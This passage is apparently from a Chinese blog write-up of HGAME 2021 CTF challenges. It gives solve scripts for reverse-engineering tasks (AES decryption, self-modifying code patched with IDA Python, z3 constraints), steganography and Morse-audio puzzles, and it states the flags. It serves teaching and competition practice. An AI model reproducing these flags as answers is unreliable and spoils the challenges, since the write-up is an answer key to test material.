创建一个共享文件映射对象</li><li>将密钥变换后映射到文件中去（可以理解成往共享内存里写密钥）</li><li>启动新进程</li></ul><p>新进程由于已经设置了共享对象，所以走 main 函数开头的 if 判断里，进行 pwd2 的检测：<br><img src="../img/hgame2021/9.png" alt="hgame2021"></p><p>由 BCryptOpenAlgorithmProvider 参数 pszAlgId 可知<strong>加密方式为 AES</strong>，由 BCryptSetProperty 参数 pbInput 可知<strong>加密模式为 CBC</strong>。BCryptGenerateSymmetricKey 的参数 pbSecret 为被映射的密钥，可以用调试器附加新进程取得：</p><p><img src="../img/hgame2021/10.png" alt="hgame2021"></p><p>由 BCryptEncrypt 的第五个参数可知 iv 为 unk_40312C，加密结果与 xmmword_4030E0 比较。解题脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">pwd1 = <span class="string">&quot;2b0c5e6a3a20b189&quot;</span></span><br><span class="line"></span><br><span class="line">cipher = <span class="string">&quot;B7FEFED9077679653F4E5F62D502F67E&quot;</span>.decode(<span class="string">&quot;hex&quot;</span>)</span><br><span class="line">key = <span class="string">&quot;2c2`1`0f;h8;n&lt;66&quot;</span></span><br><span class="line">iv = <span class="string">&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F&quot;</span></span><br><span class="line">aes = AES.new(key, AES.MODE_CBC, iv)</span><br><span class="line">pwd2 = aes.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;hgame&#123;%s_%s&#125;&quot;</span> % (pwd1, pwd2)</span><br><span class="line"><span class="comment"># hgame&#123;2b0c5e6a3a20b189_7a4ad6c5671fb313&#125;</span></span><br></pre></td></tr></table></figure><br><h4 id="fake-debugger-beta"><a href="#fake-debugger-beta" class="headerlink" title="fake_debugger beta"></a>fake_debugger beta</h4><blockquote><p>分值：150pts</p><p>描述：你写了一个什么奇怪的debugger？这东西能用？看起来规则也不太一样？</p></blockquote><p>首先测试得到最短 flag 长度为 11，输入 <code>hgame&#123;aaaaa</code>，根据单步调试结果：</p><p><img src="../img/hgame2021/11.png" alt="hgame2021"></p><p>分析可知程序会从头开始逐一字符检查输入，每个字符要单步两次才知道对不对，ecx 记录经检查已正确的字符数。对于 flag 的前 6 个字符（”hgame{“），每个字符的第一次单步中，eax ^ ebx 的结果就是这个字符应为的 ascii 值。对于 flag 的后面部分，每个字符第一次单步的 ebx 与 第二次单步的 ebx 异或的结果就是这个字符应为的 ascii 值，如上图</p><p>逐一测试后得到 flag <code>hgame&#123;You_Kn0w_debuGg3r&#125;</code></p><br><h3 id="Misc-1"><a href="#Misc-1" class="headerlink" title="Misc"></a>Misc</h3><h4 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h4><blockquote><p>分值：100pts</p><p>描述：工欲善其事，必先利其器。</p></blockquote><p>第一层：F5 隐写，密码在 <strong>属性 -&gt; 详细信息 -&gt;备注</strong> 里，<code>java Extract ~/Matryoshka.jpg -p \!LyJJ9bi\&amp;M7E72\*JyD</code>（ubuntu 下执行，注意加反斜杠转义），得到 F5.7z 压缩包密码 <code>e@317S*p1A4bIYIs1M</code></p><p>第二层：Steghide 隐写，密码也在备注里，<code>steghide extract -sf 01.jpg -p A7SL9nHRJXLh\@\$EbE8</code>，得到 Steghide.7z 压缩包密码 <code>u0!FO4JUhl5!L55%$&amp;</code></p><p>第三层：Outguess 隐写，密码在备注里，<code>outguess -k &quot;z0GFieYAee%gdf0%lF&quot; -r 02.jpg out.txt</code> ，得到 Outguess.7z 压缩包密码 <code>@UjXL93044V5zl2ZKI</code></p><p>第四层：使用软件 jphs，密码在备注里，得到 JPHS.7z 压缩包密码 <code>xSRejK1^Z1Cp9M!z@H</code></p><p>将 4 块二维码拼接起来扫描得到 flag <code>hgame&#123;Taowa_is_N0T_g00d_but_T001s_is_Useful&#125;</code></p><br><h4 id="Telegraph：1601-6639-3459-3134-0892"><a href="#Telegraph：1601-6639-3459-3134-0892" class="headerlink" title="Telegraph：1601 6639 3459 3134 0892"></a>Telegraph：1601 6639 3459 3134 0892</h4><blockquote><p>分值：150pts</p><p>描述：他曾经最喜欢的曲师写的曲子，让人犹如漫步在星空之下，可如今他听见只觉得反胃。<strong>请将flag以hgame{your_flag_here}形式提交，flag为全大写。</strong></p></blockquote><p>粗听一遍，在 1:10 左右听到一连串的摩斯电码，Audacity 打开，查看频谱图：<br><img src="../img/hgame2021/12.png" alt="hgame2021"></p><p>故摩斯电码在 850Hz 左右的频段，注意到摩斯电码中间部分与音乐本身重叠，波形图有些难以辨认，而且速度很快。考虑使用 pr 将 850Hz 的音频提取出来。音频效果里加图形均衡器（30段），把 800 和 1khz 拉高，其他全拉到最低，并延长播放时间（保持音调），导出后再用 Audacity 打开，波形图就很清晰了（修正后的音频见 exp 目录下的 pr_modified.mp3）。得到摩斯电码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- ..</span><br><span class="line">YOURFLAGIS4G00DS0NGBUTN0T4G00DMAN039310KI</span><br></pre></td></tr></table></figure><p>故 flag 为 <code>hgame&#123;4G00DS0NGBUTN0T4G00DMAN039310KI&#125;</code></p><br><h4 id="Hallucigenia"><a href="#Hallucigenia" class="headerlink" title="Hallucigenia"></a>Hallucigenia</h4><blockquote><p>分值：200pts</p><p>描述：“我们不仅弄错了他的上下，还颠倒了它的左右。”</p></blockquote><p>stegsolve 打开，在 Red plane 0 通道发现被反相的二维码，截图出来反相、扫描，得到：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=</span><br></pre></td></tr></table></figure><p>base64 解一下发现是顺序反过来的 png，脚本生成 png：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">raw = <span class="string">&quot;gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk=&quot;</span></span><br><span class="line">data = base64.b64decode(raw)[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;flag.png&quot;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(data)</span><br></pre></td></tr></table></figure><p>得到一个上下颠倒的 flag：</p><p><img src="../img/hgame2021/13.png" alt="hgame2021"></p><p>ps 里垂直翻转一下得到 flag <code>hgame&#123;tenchi_souzou_dezain_bu&#125;</code></p><br><h4 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h4><blockquote><p>分值：100pts</p><p>描述：A significant invention.</p></blockquote><p>Wireshark 打开，跟踪编号为 71 的 http 流：</p><p><img src="../img/hgame2021/14.png" alt="hgame2021"></p><p>访问的域名是 flag.hgame2021.cf，根据提示的 SPF 和题目名字 DNS，联想到通过 dig 指令查看该域名的 TXT 记录，在 ubuntu 命令行键入 <code>dig flag.hgame2021.cf TXT</code>，得到 flag：</p><p><img src="../img/hgame2021/15.png" alt="hgame2021"></p><br><h2 id="Week3"><a href="#Week3" class="headerlink" title="Week3"></a>Week3</h2><h3 id="Re-2"><a href="#Re-2" class="headerlink" title="Re"></a>Re</h3><h4 id="gun"><a href="#gun" class="headerlink" title="gun"></a>gun</h4><blockquote><p>分值：350pts</p><p>描述：I shoot flag out, Can you catch it?</p></blockquote><p>jadx 打开，发现包 com.SecShell.SecShell，梆梆加固。反射大师可以脱，但是题目附件有问题，装在手机上运行就闪退，所以就不做了= =</p><br><h4 id="FAKE"><a href="#FAKE" class="headerlink" title="FAKE"></a>FAKE</h4><blockquote><p>分值：300pts</p><p>描述：你能算出来吗？</p></blockquote><p>init_array 数组中存在 sub_406A11，在 main 函数执行前的初始化阶段被调用，该函数检测进程是否被调试，未被调试的话就调用 sub_40699B 进行 SMC。用 ida python 脚本还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;00 00 00 00 00 00 00 00 00 08 91 88 C6 45 FC 48 89 BD 28 B6 74 BA A0 C5 16 90 D3 74 FF D3 D0 35 48 8B FC FA 48 83 C0 74 02 D7 98 88 E9 C6 47 88 75 BA 17 BE 55 C0 0C 4C 85 AF 3E 34 72 AB EC 48 8B 82 6D 80 7D 3F E7 7C FA 89 D0 06 65 CE FF 2F FE 5F DE D0 01 06 CD 5B BB 17 B7 4F 35 80 8B D7 0C 04 3F 1F F9 87 09 8D 14 C6 CD 53 BB 17 B7 37 3A 00 00 C7 0E DC 95 3F BC C2 0C 48 8B 82 6D A8 7D 3F BB C7 D1 6B C0 11 84 26 B6 74 BA ED 4E 00 6B 07 98 E9 3C B7 74 CB 2B 48 83 07 C9 67 FE 94 3F DC AD C2 48 4C C0 18 B6 7C 3F 39 24 00 6B 07 3A 79 F2 FD B7 11 F0 E8 48 44 45 DC 75 EF 76 18 72 E0 03 C6 55 71 EA FE B7 B0 E8 E8 48 44 45 70 74 FF 94 8A 65 8D 0C C5 CD 8F BA 17 B7 D3 6D 68 8B D7 0C D8 3E 1D FC E7 06 C1 E0 C4 84 CD B7 74 BA 54 B9 83 C0 E7 0E 00 76 2F 3E F0 ED 29 D0 06 65 10 72 EB FE 53 68 45 E8 8F 06 D8 CF 74 FF E9 21 EC 01 05 CD 97 BA 17 B7 37 16 7C 8B C7 EE E0 E5 FE 3D 99 35 45 E8 8F 06 E4 A7 74 FF 39 07 BA 8D CB 87 60 74 BA 17 95 42 C0 1C 4C 95 A5 2F 3E 1F 5F BD D0 01 06 CD BB BA 17 B7 A3 7B 34 8B D7 0C E4 FE 3F FE 57 07 E0 04 4A 91 39 B7 74 BA EC FE 05 84 C7 85 3C 74 FF 94 95 03 01 C2 8F 0E 05 17 B7 7C E5 B9 8B 00 AC 45 9F FE 3D B7 B4 F1 E8 48 44 45 3C 74 FF 94 D6 AA 01 C2 8F 0E 09 17 B7 FA 10 B6 00 00 4C 85 5B 3E 43 72 64 02 48 8B 82 6D 7C 7D 3F EB EC 10 89 D0 06 67 3B D7 2F FE A1 8D 14 01 8F 0E 79 16 B7 7C AD 28 8B 00 AC 45 DD FF 3D B7 EE 45 E8 48 44 45 7C 75 FF 94 BB 5A 01 C2 8F 0E 0D 16 B7 7C 80 5C 8B 00 AC 45 A5 FF 3D B7 D4 45 E8 48 44 45 00 75 FF 94 86 DF 01 C2 8F 0E 11 16 B7 7C 81 6C 8B 00 C6 47 10 75 BA 17 03 83 C0 78 4C 85 D5 3F 3E 1F 46 29 C1 89 0F 84 A2 B6 74 BA B7 48 83 C0 A3 0E 64 95 3F A7 67 C2 48 8B 82 6D 20 7D 3F EF E7 00 6B C0 2A 84 AE B6 74 BA 89 48 83 C0 87 0E 70 95 3F 30 66 C2 48 8B 82 6D 3C 7D 3F 9F AA 00 6B C0 9E 84 BA B6 74 BA C5 48 83 C0 CF 0E 7C 95 3F 22 65 C2 48 8B 82 6D C8 7D 3F B7 E4 00 6B C0 7A 84 54 C3 69 03 A0 FF 0F 85 C3 D0 88 FE B7 74 1C E8 48 83 07 F1 07 EE 76 2F F1 E0 02 01 17 72 48 B6 74 AA 9D 48 83 C2 9F 0E 86 95 2D C3 5E C2 48 8B 82 6D D0 7D 3F CF E0 00 6B C0 34 08 90 FC B7 74 2A E8 48 83 07 F5 2B EE 76 2F AF E0 02 01 17 08 B0 FF B7 74 32 E8 48 83 07 C1 23 FE 94 3F FB 01 C2 48 4C C0 44 B6 7C 3F 77 8B 00 6B 07 DF B1 3C B7 74 08 E8 48 83 07 AD 3F FE 94 3F 7D 01 C2 48 4C C0 50 B6 7C 3F 63 8B 00 6B 07 BC BD 3C B7 74 38 E8 48 83 07 29 77 01 6B C0 A5 C6 87 B0 8B 45 E8 8B E9 D2 C0 D8 01 05 0D 7F 45 E8 48 83 29 E3 8B 00 6B 07 7D F1 C2 48 8B 45 01 CD 83 E8 80 00 55 71 48 11 E1 C6 28 11 88 08 04 CE 89 0D 7F 44 38 00 1B 4B 94 0E 40 76 2F 3E 69 56 D1 59 11 E1 C3 00 11 49 4B CC 2A C3 40 7C 01 D0 48 13 58 04 C4 44 E0 02 01 D0 49 4B 84 E9 B6 74 BA A0 49 53 4B 08 02 D1 02 85 F1 49 D1 D1 01 E1 D2 00 10 88 03 C3 CE B1 E9 98 CB 58 E3 0F 95 B9 2E 3E 1F 0D AE 18 06 41 F9 C1 5B 44 28 49 53 C1 F4 02 C2 02 84 35 E1 D6 A4 D5 87 80 99 4B DC 0E 15 17 B7 7C 43 55 7B 01 E8 BD C9 04 CD C6 FA BA 17 B7 00 85 A0 8A 83 16 34 5F 0E 4C 1F 74 BA 17 CB C6 38 3D 08 7D 93 C5 C8 8F FF B7 74 BA 2F 0D 6F C0 48 8B 00 2A B8 C1 44 2A 48 8B 45 E8 A3 C6 4B 41 67 89 BB C1 DE 00 12 49 4B CC 2A C3 C6 28 19 5B 48 F3 4B 63 84 92 B7 74 BA 63 1D 6F 49 9C 8A C0 6A 10 B0 C1 4B 8A 00 00 00 49 D5 CC 98 8B 84 0E C0 95 3F D0 38 03 3C 8C 82 AD B4 83 C0 04 8B 83 2E 28 ED 82 BF A0 8E 3B 5D CB 40 64 01 83 7D 67 05 15 62 C8 44 3E 81 48 00 04 70 40 00 00 00 00 00&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">table = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> table]</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x401216</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x43F</span>):</span><br><span class="line">b = get_bytes(addr + i, <span class="number">1</span>)</span><br><span class="line">idc.PatchByte(addr + i, <span class="built_in">ord</span>(b) ^ table[i])</span><br></pre></td></tr></table></figure><p>之后 main 函数调用 sub_401216 检查输入，该函数意在解多元一次方程组，使用 z3：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag = [BitVec(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>)]</span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(<span class="number">104</span> * flag[<span class="number">0</span>] + <span class="number">64</span> * flag[<span class="number">1</span>] + <span class="number">95</span> * flag[<span class="number">2</span>] + <span class="number">45</span> * flag[<span class="number">3</span>] + <span class="number">117</span> * flag[<span class="number">4</span>] + <span class="number">95</span> * flag[<span class="number">5</span>] == <span class="number">55030</span>)</span><br><span class="line">solver.add(<span class="number">103</span> * flag[<span class="number">0</span>] + <span class="number">95</span> * flag[<span class="number">1</span>] + <span class="number">102</span> * flag[<span class="number">2</span>] + <span class="number">100</span> * flag[<span class="number">3</span>] + <span class="number">95</span> * flag[<span class="number">4</span>] + <span class="number">83</span> * flag[<span class="number">5</span>] == <span class="number">61095</span>)</span><br><span class="line">solver.add(<span class="number">97</span> * flag[<span class="number">0</span>] + <span class="number">70</span> * flag[<span class="number">1</span>] + <span class="number">108</span> * flag[<span class="number">2</span>] + <span class="number">111</span> * flag[<span class="number">3</span>] + <span class="number">107</span> * flag[<span class="number">4</span>] + <span class="number">77</span> * flag[<span class="number">5</span>] == <span class="number">60151</span>)</span><br><span class="line">solver.add(<span class="number">109</span> * flag[<span class="number">0</span>] + <span class="number">65</span> * flag[<span class="number">1</span>] + <span class="number">97</span> * flag[<span class="number">2</span>] + <span class="number">95</span> * flag[<span class="number">3</span>] + <span class="number">111</span> * flag[<span class="number">4</span>] + <span class="number">67</span> * flag[<span class="number">5</span>] == <span class="number">57247</span>)</span><br><span class="line">solver.add(<span class="number">101</span> * flag[<span class="number">0</span>] + <span class="number">75</span> * flag[<span class="number">1</span>] + <span class="number">103</span> * flag[<span class="number">2</span>] + <span class="number">89</span> * flag[<span class="number">3</span>] + <span class="number">110</span> * flag[<span class="number">4</span>] + <span class="number">63</span> * flag[<span class="number">5</span>] == <span class="number">56780</span>)</span><br><span class="line">solver.add(<span class="number">123</span> * flag[<span class="number">0</span>] + <span class="number">69</span> * flag[<span class="number">1</span>] + <span class="number">33</span> * flag[<span class="number">2</span>] + <span class="number">48</span> * flag[<span class="number">3</span>] + <span class="number">119</span> * flag[<span class="number">4</span>] + <span class="number">125</span> * flag[<span class="number">5</span>] == <span class="number">55726</span>)</span><br><span class="line">solver.add(<span class="number">104</span> * flag[<span class="number">6</span>] + <span class="number">64</span> * flag[<span class="number">7</span>] + <span class="number">95</span> * flag[<span class="number">8</span>] + <span class="number">45</span> * flag[<span class="number">9</span>] + <span class="number">117</span> * flag[<span class="number">10</span>] + <span class="number">95</span> * flag[<span class="number">11</span>] == <span class="number">46642</span>)</span><br><span class="line">solver.add(<span class="number">103</span> * flag[<span class="number">6</span>] + <span class="number">95</span> * flag[<span class="number">7</span>] + <span class="number">102</span> * flag[<span class="number">8</span>] + <span class="number">100</span> * flag[<span class="number">9</span>] + <span class="number">95</span> * flag[<span class="number">10</span>] + <span class="number">83</span> * flag[<span class="number">11</span>] == <span class="number">52931</span>)</span><br><span class="line">solver.add(<span class="number">97</span> * flag[<span class="number">6</span>] + <span class="number">70</span> * flag[<span class="number">7</span>] + <span class="number">108</span> * flag[<span class="number">8</span>] + <span class="number">111</span> * flag[<span class="number">9</span>] + <span class="number">107</span> * flag[<span class="number">10</span>] + <span class="number">77</span> * flag[<span class="number">11</span>] == <span class="number">53580</span>)</span><br><span class="line">solver.add(<span class="number">109</span> * flag[<span class="number">6</span>] + <span class="number">65</span> * flag[<span class="number">7</span>] + <span class="number">97</span> * flag[<span class="number">8</span>] + <span class="number">95</span> * flag[<span class="number">9</span>] + <span class="number">111</span> * flag[<span class="number">10</span>] + <span class="number">67</span> * flag[<span class="number">11</span>] == <span class="number">50437</span>)</span><br><span class="line">solver.add(<span class="number">101</span> * flag[<span class="number">6</span>] + <span class="number">75</span> * flag[<span class="number">7</span>] + <span class="number">103</span> * flag[<span class="number">8</span>] + <span class="number">89</span> * flag[<span class="number">9</span>] + <span class="number">110</span> * flag[<span class="number">10</span>] + <span class="number">63</span> * flag[<span class="number">11</span>] == <span class="number">50062</span>)</span><br><span class="line">solver.add(<span class="number">123</span> * flag[<span class="number">6</span>] + <span class="number">69</span> * flag[<span class="number">7</span>] + <span class="number">33</span> * flag[<span class="number">8</span>] + <span class="number">48</span> * flag[<span class="number">9</span>] + <span class="number">119</span> * flag[<span class="number">10</span>] + <span class="number">125</span> * flag[<span class="number">11</span>] == <span class="number">44186</span>)</span><br><span class="line">solver.add(<span class="number">104</span> * flag[<span class="number">12</span>] + <span class="number">64</span> * flag[<span class="number">13</span>] + <span class="number">95</span> * flag[<span class="number">14</span>] + <span class="number">45</span> * flag[<span class="number">15</span>] + <span class="number">117</span> * flag[<span class="number">16</span>] + <span class="number">95</span> * flag[<span class="number">17</span>] == <span class="number">44909</span>)</span><br><span class="line">solver.add(<span class="number">103</span> * flag[<span class="number">12</span>] + <span class="number">95</span> * flag[<span class="number">13</span>] + <span class="number">102</span> * flag[<span class="number">14</span>] + <span class="number">100</span> * flag[<span class="number">15</span>] + <span class="number">95</span> * flag[<span class="number">16</span>] + <span class="number">83</span> * flag[<span class="number">17</span>] == <span class="number">46490</span>)</span><br><span class="line">solver.add(<span class="number">97</span> * flag[<span class="number">12</span>] + <span class="number">70</span> * flag[<span class="number">13</span>] + <span class="number">108</span> * flag[<span class="number">14</span>] + <span class="number">111</span> * flag[<span class="number">15</span>] + <span class="number">107</span> * flag[<span class="number">16</span>] + <span class="number">77</span> * flag[<span class="number">17</span>] == <span class="number">46024</span>)</span><br><span class="line">solver.add(<span class="number">109</span> * flag[<span class="number">12</span>] + <span class="number">65</span> * flag[<span class="number">13</span>] + <span class="number">97</span> * flag[<span class="number">14</span>] + <span class="number">95</span> * flag[<span class="number">15</span>] + <span class="number">111</span> * flag[<span class="number">16</span>] + <span class="number">67</span> * flag[<span class="number">17</span>] == <span class="number">44347</span>)</span><br><span class="line">solver.add(<span class="number">101</span> * flag[<span class="number">12</span>] + <span class="number">75</span> * flag[<span class="number">13</span>] + <span class="number">103</span> * flag[<span class="number">14</span>] + <span class="number">89</span> * flag[<span class="number">15</span>] + <span class="number">110</span> * flag[<span class="number">16</span>] + <span class="number">63</span> * flag[<span class="number">17</span>] == <span class="number">43850</span>)</span><br><span class="line">solver.add(<span class="number">123</span> * flag[<span class="number">12</span>] + <span class="number">69</span> * flag[<span class="number">13</span>] + <span class="number">33</span> * flag[<span class="number">14</span>] + <span class="number">48</span> * flag[<span class="number">15</span>] + <span class="number">119</span> * flag[<span class="number">16</span>] + <span class="number">125</span> * flag[<span class="number">17</span>] == <span class="number">44368</span>)</span><br><span class="line">solver.add(<span class="number">104</span> * flag[<span class="number">18</span>] + <span class="number">64</span> * flag[<span class="number">19</span>] + <span class="number">95</span> * flag[<span class="number">20</span>] + <span class="number">45</span> * flag[<span class="number">21</span>] + <span class="number">117</span> * flag[<span class="number">22</span>] + <span class="number">95</span> * flag[<span class="number">23</span>] == <span class="number">54990</span>)</span><br><span class="line">solver.add(<span class="number">103</span> * flag[<span class="number">18</span>] + <span class="number">95</span> * flag[<span class="number">19</span>] + <span class="number">102</span> * flag[<span class="number">20</span>] + <span class="number">100</span> * flag[<span class="number">21</span>] + <span class="number">95</span> * flag[<span class="number">22</span>] + <span class="number">83</span> * flag[<span class="number">23</span>] == <span class="number">61884</span>)</span><br><span class="line">solver.add(<span class="number">97</span> * flag[<span class="number">18</span>] + <span class="number">70</span> * flag[<span class="number">19</span>] + <span class="number">108</span> * flag[<span class="number">20</span>] + <span class="number">111</span> * flag[<span class="number">21</span>] + <span class="number">107</span> * flag[<span class="number">22</span>] + <span class="number">77</span> * flag[<span class="number">23</span>] == <span class="number">61202</span>)</span><br><span class="line">solver.add(<span class="number">109</span> * flag[<span class="number">18</span>] + <span class="number">65</span> * flag[<span class="number">19</span>] + <span class="number">97</span> * flag[<span class="number">20</span>] + <span class="number">95</span> * flag[<span class="number">21</span>] + <span class="number">111</span> * flag[<span class="number">22</span>] + <span class="number">67</span> * flag[<span class="number">23</span>] == <span class="number">58139</span>)</span><br><span class="line">solver.add(<span class="number">101</span> * flag[<span class="number">18</span>] + <span class="number">75</span> * flag[<span class="number">19</span>] + <span class="number">103</span> * flag[<span class="number">20</span>] + <span class="number">89</span> * flag[<span class="number">21</span>] + <span class="number">110</span> * flag[<span class="number">22</span>] + <span class="number">63</span> * flag[<span class="number">23</span>] == <span class="number">57730</span>)</span><br><span class="line">solver.add(<span class="number">123</span> * flag[<span class="number">18</span>] + <span class="number">69</span> * flag[<span class="number">19</span>] + <span class="number">33</span> * flag[<span class="number">20</span>] + <span class="number">48</span> * flag[<span class="number">21</span>] + <span class="number">119</span> * flag[<span class="number">22</span>] + <span class="number">125</span> * flag[<span class="number">23</span>] == <span class="number">54964</span>)</span><br><span class="line">solver.add(<span class="number">104</span> * flag[<span class="number">24</span>] + <span class="number">64</span> * flag[<span class="number">25</span>] + <span class="number">95</span> * flag[<span class="number">26</span>] + <span class="number">45</span> * flag[<span class="number">27</span>] + <span class="number">117</span> * flag[<span class="number">28</span>] + <span class="number">95</span> * flag[<span class="number">29</span>] == <span class="number">48849</span>)</span><br><span class="line">solver.add(<span class="number">103</span> * flag[<span class="number">24</span>] + <span class="number">95</span> * flag[<span class="number">25</span>] + <span class="number">102</span> * flag[<span class="number">26</span>] + <span class="number">100</span> * flag[<span class="number">27</span>] + <span class="number">95</span> * flag[<span class="number">28</span>] + <span class="number">83</span> * flag[<span class="number">29</span>] == <span class="number">51026</span>)</span><br><span class="line">solver.add(<span class="number">97</span> * flag[<span class="number">24</span>] + <span class="number">70</span> * flag[<span class="number">25</span>] + <span class="number">108</span> * flag[<span class="number">26</span>] + <span class="number">111</span> * flag[<span class="number">27</span>] + <span class="number">107</span> * flag[<span class="number">28</span>] + <span class="number">77</span> * flag[<span class="number">29</span>] == <span class="number">49629</span>)</span><br><span class="line">solver.add(<span class="number">109</span> * flag[<span class="number">24</span>] + <span class="number">65</span> * flag[<span class="number">25</span>] + <span class="number">97</span> * flag[<span class="number">26</span>] + <span class="number">95</span> * flag[<span class="number">27</span>] + <span class="number">111</span> * flag[<span class="number">28</span>] + <span class="number">67</span> * flag[<span class="number">29</span>] == <span class="number">48219</span>)</span><br><span class="line">solver.add(<span class="number">101</span> * flag[<span class="number">24</span>] + <span class="number">75</span> * flag[<span class="number">25</span>] + <span class="number">103</span> * flag[<span class="number">26</span>] + <span class="number">89</span> * flag[<span class="number">27</span>] + <span class="number">110</span> * flag[<span class="number">28</span>] + <span class="number">63</span> * flag[<span class="number">29</span>] == <span class="number">47904</span>)</span><br><span class="line">solver.add(<span class="number">123</span> * flag[<span class="number">24</span>] + <span class="number">69</span> * flag[<span class="number">25</span>] + <span class="number">33</span> * flag[<span class="number">26</span>] + <span class="number">48</span> * flag[<span class="number">27</span>] + <span class="number">119</span> * flag[<span class="number">28</span>] + <span class="number">125</span> * flag[<span class="number">29</span>] == <span class="number">50823</span>)</span><br><span class="line">solver.add(<span class="number">104</span> * flag[<span class="number">30</span>] + <span class="number">64</span> * flag[<span class="number">31</span>] + <span class="number">95</span> * flag[<span class="number">32</span>] + <span class="number">45</span> * flag[<span class="number">33</span>] + <span class="number">117</span> * flag[<span class="number">34</span>] + <span class="number">95</span> * flag[<span class="number">35</span>] == <span class="number">46596</span>)</span><br><span class="line">solver.add(<span class="number">103</span> * flag[<span class="number">30</span>] + <span class="number">95</span> * flag[<span class="number">31</span>] + <span class="number">102</span> * flag[<span class="number">32</span>] + <span 